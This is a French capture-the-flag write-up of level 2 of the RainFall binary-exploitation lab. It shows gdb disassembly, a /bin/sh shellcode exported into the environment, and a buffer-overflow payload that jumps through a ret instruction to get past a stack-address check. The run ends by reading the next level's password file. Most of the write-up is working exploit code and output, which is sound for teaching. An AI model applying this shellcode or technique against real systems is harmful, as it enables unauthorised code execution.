# Level 2

Ce binaire utilise aussi la fonction [`gets`](https://linux.die.net/man/3/gets) comme le [niveau 1](/level1/README.md). Cependant le programme a une protection qui vérifie si l'adresse de EIP n'est pas une adresse de la stack, commencant donc par `0xb...`. Mais nous pouvons exporter un [*shellcode*](https://en.wikipedia.org/wiki/Shellcode) dans l'environnement, et *jump* à l'adresse de `return` et la modifier par l'adresse de notre shellcode.

Nous pouvons importer notre shellcode dans l'`env` et lors du `ret` jump à cette adresse :
```shell
~ export SHELLCODE=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"'`
~ gdb level2
[...]
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
[...]
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
[...]
   0x0804853e <+106>:	ret
End of assembler dump.
(gdb) b *0x08048542
Breakpoint 1 at 0x8048542
(gdb) r
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) info variable env
All variables matching regular expression "env":

Non-debugging symbols:
0xb7fd2e04  __environ
0xb7fd2e04  _environ
0xb7fd2e04  environ
(gdb) x/s *((char**)environ+0)
0xbffff88e:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343\231RS\211\341\260\v\315\200""
(gdb) quit
~ python -c 'print "B"*80 + "\x3e\x85\x04\x08" + "\x8e\xf8\xff\xbf"' > /tmp/level2
~ level2@RainFall:~$ cat /tmp/level2 - | ./level2
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB>BBBBBBBBBBBB>����
pwd
/home/user/level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```